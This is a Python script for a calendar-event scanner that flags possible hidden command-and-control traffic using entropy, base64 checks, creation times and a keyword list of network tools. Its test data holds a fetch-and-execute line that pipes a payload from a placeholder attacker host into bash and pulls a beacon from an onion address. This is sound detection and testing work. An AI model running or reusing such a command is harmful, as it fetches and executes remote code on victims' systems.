import base64
import math
from datetime import datetime

def calculate_entropy(text):
    """
    Calculate Shannon entropy of a string.
    High entropy = likely encoded/encrypted payload.
    
    Cloudflare 2026 Threat Report: Chinese APT groups embed
    base64-encoded C2 commands in Calendar event descriptions.
    Legitimate calendar text has entropy ~3.5
    Encoded payloads typically exceed 4.5
    """
    if not text:
        return 0
    freq = {}
    for c in text:
        freq[c] = freq.get(c, 0) + 1
    length = len(text)
    entropy = -sum(
        (count / length) * math.log2(count / length)
        for count in freq.values()
    )
    return round(entropy, 3)


def is_base64(text):
    """Check if a string is valid base64 encoded content."""
    try:
        if len(text) % 4 != 0:
            return False
        decoded = base64.b64decode(text)
        return len(decoded) > 20
    except Exception:
        return False


def check_suspicious_timing(event):
    """
    Flag events created outside business hours.
    APT operators typically push C2 commands during victim's off-hours
    to reduce chance of real-time detection.
    """
    created = event.get('created', '')
    if not created:
        return False
    try:
        hour = datetime.fromisoformat(created).hour
        return hour < 7 or hour > 22
    except Exception:
        return False


def analyse_event(event):
    """
    Core detection logic — analyse a single calendar event
    for Living-off-the-Cloud C2 indicators.
    
    Returns a risk report dict with findings and severity.
    """
    description = event.get('description', '')
    title = event.get('summary', 'Untitled')
    flags = []
    evidence = []

    # Check 1 — Shannon entropy on description field
    entropy = calculate_entropy(description)
    if entropy > 4.5:
        flags.append('HIGH_ENTROPY')
        evidence.append(f"Entropy score {entropy} exceeds threshold of 4.5")

    # Check 2 — Base64 decodable content
    if is_base64(description.strip()):
        flags.append('BASE64_PAYLOAD')
        evidence.append("Description is valid base64 — possible encoded C2 command")

    # Check 3 — Suspicious creation time
    if check_suspicious_timing(event):
        flags.append('OFF_HOURS_CREATION')
        evidence.append("Event created outside business hours (before 07:00 or after 22:00)")

    # Check 4 — Unusually short title with long description
    if len(title) < 10 and len(description) > 200:
        flags.append('SUSPICIOUS_RATIO')
        evidence.append(f"Short title ({len(title)} chars) with long description ({len(description)} chars)")

    # Check 5 — Known C2 payload markers
    c2_markers = ['cmd=', 'exec=', 'payload=', '/bin/', 'powershell', 'wget', 'curl -s']
    found_markers = [m for m in c2_markers if m.lower() in description.lower()]
    if found_markers:
        flags.append('C2_MARKERS')
        evidence.append(f"Known C2 markers found: {found_markers}")

    # Risk scoring
    if len(flags) >= 3:
        risk = 'CRITICAL'
    elif len(flags) == 2:
        risk = 'HIGH'
    elif len(flags) == 1:
        risk = 'MEDIUM'
    else:
        risk = 'LOW'

    return {
        'event': title,
        'entropy': entropy,
        'flags': flags,
        'evidence': evidence,
        'risk': risk,
        'flag_count': len(flags)
    }


def scan_events(events):
    """
    Scan a list of calendar events and return prioritised findings.
    Higher risk events surfaced first.
    """
    results = []
    for event in events:
        result = analyse_event(event)
        results.append(result)

    # Sort by risk severity
    risk_order = {'CRITICAL': 0, 'HIGH': 1, 'MEDIUM': 2, 'LOW': 3}
    results.sort(key=lambda x: risk_order[x['risk']])
    return results


def print_report(results):
    """Print a clean terminal report of findings."""
    print("\n" + "="*60)
    print("  LotX Detector — C2 Beacon Analysis Report")
    print("  Based on Cloudflare 2026 Threat Report findings")
    print("="*60)

    critical = [r for r in results if r['risk'] == 'CRITICAL']
    high = [r for r in results if r['risk'] == 'HIGH']

    print(f"\n  Total events scanned: {len(results)}")
    print(f"  Critical findings:    {len(critical)}")
    print(f"  High findings:        {len(high)}")
    print()

    for r in results:
        if r['risk'] in ('CRITICAL', 'HIGH', 'MEDIUM'):
            print(f"  [{r['risk']}] {r['event']}")
            print(f"  Entropy: {r['entropy']} | Flags: {r['flag_count']}")
            for e in r['evidence']:
                print(f"    → {e}")
            print()

    print("="*60 + "\n")


if __name__ == "__main__":
    # Test events — simulating APT C2 patterns
    # documented in Cloudflare's 2026 Threat Report
    test_events = [
        {
            'summary': 'Q2 Planning',
            'description': 'U2FsdGVkX1+mocked+base64+payload+simulating+C2+beacon+command+exec=whoami==',
            'created': '2026-03-18T03:42:00'
        },
        {
            'summary': 'Team standup',
            'description': 'Discuss sprint progress and blockers. Review PRs.',
            'created': '2026-03-18T09:00:00'
        },
        {
            'summary': 'Sync',
            'description': 'curl -s http://185.220.x.x/payload | bash && wget http://c2.onion/beacon',
            'created': '2026-03-18T02:15:00'
        },
        {
            'summary': 'Budget review',
            'description': 'Q3 budget planning session with finance team.',
            'created': '2026-03-18T14:00:00'
        }
    ]

    results = scan_events(test_events)
    print_report(results)
